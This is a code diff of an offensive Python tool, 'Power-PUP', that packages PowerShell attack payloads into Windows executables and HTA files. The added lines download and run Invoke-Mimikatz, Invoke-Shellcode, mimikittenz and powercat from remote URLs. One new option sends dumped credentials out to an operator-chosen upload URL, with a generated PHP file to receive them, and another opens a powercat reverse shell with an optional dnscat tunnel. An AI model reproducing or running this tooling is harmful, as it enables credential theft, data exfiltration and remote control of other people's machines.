@@ -63,11 +63,10 @@ from sys import argv
 
 name = "Powershell Universal Programmer"
 shrtname = " (Power-PUP.py)"
-__version__ = "1.7"
+__version__ = "0.7"
 
 
 banner = '''
-
                                   ,.+----.
                               ,*""         I
              ____           /         Mbp. dP          __
@@ -101,9 +100,6 @@ banner = '''
                 |         /'      /&#P~         
      /          `\______/'\_____/'              
                                    /            
-                          /
-             /                          
-
 '''
 
 ps_script          = ""
@@ -112,20 +108,35 @@ def mimi_quick(mimifunct,location):
     # invoke-mimicatz quick execute
 
     # If not from comman line
-    if mimifunct != True or location == 'http://127.0.0.1/1.txt':
+    if mimifunct != True:
         location = raw_input("\nEnter Invoke-Mimikatz location (Ex. http://192.168.1.1/im.txt) : \n: ")
         if location == '':
-            location = 'http://127.0.0.1/1.txt'
+            location = 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'
     
-    ps_script = "IEX (New-Object Net.WebClient).DownloadString('" + location + "'); Invoke-Mimikatz -DumpCreds > c:\\Users\\Public\\katz.txt"
+    mimiout = raw_input("\nEnter where to upload output file: (Ex. http://192.168.1.1/out.php) : \n: ")
+    if mimiout == '':
+        ps_script = "IEX (New-Object Net.WebClient).DownloadString('" + location + "'); Invoke-Mimikatz -DumpCreds > c:\\Users\\Public\\katz.txt"
+        print '\nFile will be saved to: c:\\Users\\Public\\katz.txt\n'
+    else:
+        ps_script = "IEX (New-Object Net.WebClient).DownloadString('" + location + "'); $output = Invoke-Mimikatz -DumpCreds; (New-Object Net.WebClient).UploadString('" + mimiout + "', $output)"
 
-    print '\nFile will be saved to: c:\\Users\\Public\\katz.txt\n'
+        # create php upload/post file
+        with open('upload.php', 'w') as f:
+            f.write("<?php \n$file = $_SERVER['REMOTE_ADDR'] . \"_\" . date(\"Y-m-d_H-i-s\") . \".creds\"; \nfile_put_contents($file, file_get_contents(\"php://input\")); \n?> \n")
+            f.close
+
+        print '\nFile will be uploaded to: ' + mimiout
+        print '\n - To start a simple PHP web server: php -S 127.0.0.1:80'
+        print '\n - Move "upload.php" to ' + mimiout + '\n'
+
     return ps_script
     
 def kitti_quick():
     # invoke-mimicatz quick execute
 
     location = raw_input("\nEnter Invoke-Mimikittenz location (Ex. http://192.168.1.1/im.txt) : \n: ")
+    if location == '':
+        location = "https://raw.githubusercontent.com/putterpanda/mimikittenz/master/Invoke-mimikittenz.ps1"
     ps_script = "IEX (New-Object Net.WebClient).DownloadString('" + location + "'); Invoke-mimikittenz > c:\\Users\\Public\\kitz.txt"
 
     print '\nFile will be saved to: c:\\Users\\Public\\kitz.txt\n'
@@ -136,9 +147,9 @@ def shell_quick(shellcode,location,lhost,lport,payload):
 
     # If not from comman line
     if shellcode != True:
-        location = raw_input("\nEnter Invoke-Shellcode location (Default - http://127.0.0.1/1.txt) : \n: ")
+        location = raw_input("\nEnter Invoke-Shellcode location (Default - Github) : \n: ")
         if location == '':
-            location = "http://127.0.0.1/1.txt"
+            location = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1"
         lhost = raw_input("\nEnter reverse host (Default - 127.0.0.1) : \n: ")
         if lhost == '':
             lhost = "127.0.0.1"
@@ -155,8 +166,8 @@ def shell_quick(shellcode,location,lhost,lport,payload):
     print '   LHOST        : ' + lhost
     print '   LPORT        : ' + lport
     print 
-    print '   Resource file: handler.rc'
-    print '   HTA File     : pup.hta'
+    print '   Resource file          : handler.rc'
+    print '   HTA File (Experimental): pup.hta'
     print
 
     # create msf rc file
@@ -166,6 +177,42 @@ def shell_quick(shellcode,location,lhost,lport,payload):
 
     create_hta(ps_script)
     return ps_script
+
+def pcat(powercat,location,lhost,lport,payload):
+    # invoke-shellcode quick execute
+
+    # If not from comman line
+    if powercat != True:
+        location = raw_input("\nEnter Powercat location (Default - http://127.0.0.1/pc.txt) : \n: ")
+        if location == '':
+            location = "http://127.0.0.1/pc.txt"
+        lhost = raw_input("\nEnter reverse host (Default - 127.0.0.1) : \n: ")
+        if lhost == '':
+            lhost = "127.0.0.1"
+        lport = raw_input("\nEnter reverse port (Default - 443) : \n: ")
+        if lport == '':
+            lport = "443"
+        payload1 = raw_input("\nEnter Hostname for dnscat (Default - none) : \n: ") 
+        if payload1 != '':
+            payload = " -dns " + payload1
+        else:
+            payload = ""
+    
+    print '\nConfigure Listener'
+    if payload == '':
+        ps_script = "(IEX (New-Object Net.WebClient).DownloadString('" + location + "')) -or (powercat -c " + lhost + " -p " + lport + " -e cmd)"
+        print '   PS : powercat -l -p ' + lport
+        print '   PS : (IEX (New-Object System.Net.Webclient).DownloadString(\'https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1\')) -or (powercat -l -p ' + lport + ')'
+    else:
+        ps_script = "(IEX (New-Object Net.WebClient).DownloadString('" + location + "')) -or (powercat -c " + lhost + " -p " + lport + payload + " -e cmd)"
+        print '   # : dnscat2 ' + payload1
+    print 
+    print '   HTA File (Experimental): pup.hta'
+    print
+
+    create_hta(ps_script)
+    return ps_script
+
 
 def enter_ps():
     ps_input = raw_input("Enter the powershell commands to execute seperated by <ENTER>. \n: ")
@@ -208,15 +255,15 @@ def compile_exe(arch,out_exe):
     # Compile the executable
 
     if arch == 'x86':
-        dotnet_loc = "C:\\Windows\Microsoft.NET\\Framework\\v4.0.30319\\"
+        dotnet_loc = "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\"
     else:
         dotnet_loc = "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\"
 
-    os.system('cmd.exe /c ' + dotnet_loc + 'csc.exe /unsafe /reference:"C:\\windows\\assembly\\GAC_MSIL\\System.Management.Automation\\1.0.0.0__31bf3856ad364e35\\System.Management.Automation.dll" /reference:System.IO.Compression.dll /out:' + out_exe + ' /platform:' + arch +' "temp.cs"')
+    os.system('cmd.exe /c ' + dotnet_loc + 'csc.exe /unsafe /reference:"C:\\windows\\assembly\\GAC_MSIL\\System.Management.Automation\\1.0.0.0__31bf3856ad364e35\\System.Management.Automation.dll" /reference:System.IO.Compression.dll /out:' + out_exe + ' /platform:' + arch +' "temp.cs" > nul 2>&1')
 
 
 def create_hta(ps_script):
-    # create hta file
+    # create hta file - EXPERIMENTAL will probably get flagged
 
     with open('pup.hta', 'w') as f:
         f.write('<html>\n<head>\n<script language="VBScript">\n    Set objShell1 = CreateObject("Wscript.Shell")\n    Set objShell2 = CreateObject("Wscript.Shell")\n    Set objShell3 = CreateObject("Wscript.Shell")\n    Set objShell4 = CreateObject("Wscript.Shell")\n    Set objShell5 = CreateObject("Wscript.Shell")\n    Set objShell6 = CreateObject("Wscript.Shell")\n    objShell1.Run "cmd.exe /c echo using System; > c:\\users\\public\\temp.cs && echo using System.Collections.ObjectModel; >> c:\\users\\public\\temp.cs && echo using System.Management.Automation; >> c:\\users\\public\\temp.cs && echo using System.Management.Automation.Runspaces; >> c:\\users\\public\\temp.cs && echo namespace pup >> c:\\users\\public\\temp.cs && echo { >> c:\\users\\public\\temp.cs && echo class Program >> c:\\users\\public\\temp.cs && echo { >> c:\\users\\public\\temp.cs && echo static void Main(string[] args) >> c:\\users\\public\\temp.cs && echo { >> c:\\users\\public\\temp.cs && echo PowerShell ps = PowerShell.Create(); >> c:\\users\\public\\temp.cs')
@@ -240,8 +287,11 @@ def usage():
     print "Usage: Power-PUP.py"
     print "-a | --arch                - architecture of the target host"
     print "-o | --output              - executable output name"
+    print "---------------Actions---------------"
     print "-m | --mimi                - Create a mimikatz executable"
     print "-s | --shellcode           - Create a shellcode executable"
+    print "-c | --powercat            - Create an executable with a reverse powercat connection"
+    print "-----------Payload Options-----------"
     print "-d | --hostserver          - PS script host location"
     print "-l | --lhost               - Host listening for reverse connections"
     print "                               Default: 127.0.0.1"
@@ -250,35 +300,33 @@ def usage():
     print "-t | --payload             - Metasploit payload to utilize"
     print "                               Default: windows/meterpreter/reverse_https"
     print
-    print
     print "Examples: "
-    print "Power-PUP.py -a x86"
-    print "Power-PUP.py -a x64 -o psx64.exe"
-    print "Power-PUP.py -a x64 -m -d http://192.168.1.1/im.txt"
-    print "Power-PUP.py -a x64 -s -d http://192.168.1.1/im.txt --lhost 192.168.1.1 --lport 443"
-    
+    print "Power-PUP.py"
+    #print "Power-PUP.py -a x64 -o psx64.exe"
+    #print "Power-PUP.py -a x64 -m -d http://192.168.1.1/im.txt"
+    print "Power-PUP.py -a x64 -s -d http://192.168.1.1/is.txt --lhost 192.168.1.1 --lport 443"
+
     sys.exit(0)
 
 
 def main():
 
     # define some global variables
-    location           = "http://127.0.0.1/1.txt"
+    location           = ""
     lhost              = "127.0.0.1"
     lport              = "443"
     mimifunct          = False
     shellcode          = False
+    powercat           = False
     target             = ""
     payload            = "windows/meterpreter/reverse_https"
-    arch               = "x86"
+    arch               = ""
     comm               = False
     debug              = False
     #ps_script          = ""
     
     # Begin
-    print "\n" + name + " v" + __version__
-    print shrtname + "\n"
-    print
+    print "\n" + name + " v" + __version__ + shrtname
     print banner
     # check if running windows
     if os.name != 'nt':
@@ -292,7 +340,7 @@ def main():
     # read the commandline options
     try:
         # variable: <- variable with argument, no : no argument ex. a
-        opts, args = getopt.getopt(sys.argv[1:],"ha:o:md:sl:p:t:",["help","arch","output","mimi","hostserver","shellcode","lhost","lport","payload","debug"])
+        opts, args = getopt.getopt(sys.argv[1:],"ha:o:md:scl:p:t:",["help","arch","output","mimi","hostserver","shellcode","powercat","lhost","lport","payload","debug"])
     except getopt.GetoptError as err:
         print str(err)
         usage()
@@ -312,6 +360,8 @@ def main():
                 mimifunct = True
             elif o in ("-s", "--shellcode"):
                 shellcode = True
+            elif o in ("-c", "--powercat"):
+                powercat = True
             elif o in ("-d", "--hostserver"):
                 location = a
             elif o in ("-l", "--lhost"):
@@ -333,12 +383,20 @@ def main():
         ps_script = shell_quick(shellcode,location,lhost,lport,payload)
     else:
         # Menu if no command line inputs
+
+        if arch == '':
+            arch = raw_input("\nEnter target system architecture (x86 or x64) : \n: ")
+            while arch not in ["x86", "x64"]:
+                print "\nOnly x86 or x64 architectures are allowed.\n"
+                sys.exit(0)
+        print
         menu = {}
         menu['1']=" Invoke-Mimikatz" 
         menu['2']=" Invoke-Shellcode"
-        menu['3']=" Invoke-Mimikittenz" 
-        menu['4']=" Custom PowerShell Command"
-        menu['5']=" Exit"
+        menu['3']=" Powercat" 
+        menu['4']=" Invoke-Mimikittenz" 
+        menu['5']=" Custom PowerShell Command"
+        menu['9']=" Exit"
         options=menu.keys()
         options.sort()
         for entry in options: 
@@ -350,11 +408,13 @@ def main():
         elif selection == '2': 
             ps_script = shell_quick(shellcode,location,lhost,lport,payload)
         elif selection == '3': 
+            ps_script = pcat(powercat,location,lhost,lport,payload)
+        elif selection == '4': 
             ps_script = kitti_quick()
-        elif selection == '4':
+        elif selection == '5':
             comm = True
             ps_script = enter_ps() 
-        elif selection == '5': 
+        elif selection == '9': 
             sys.exit(0)
         else: 
             print "Unknown Option Selected!" 
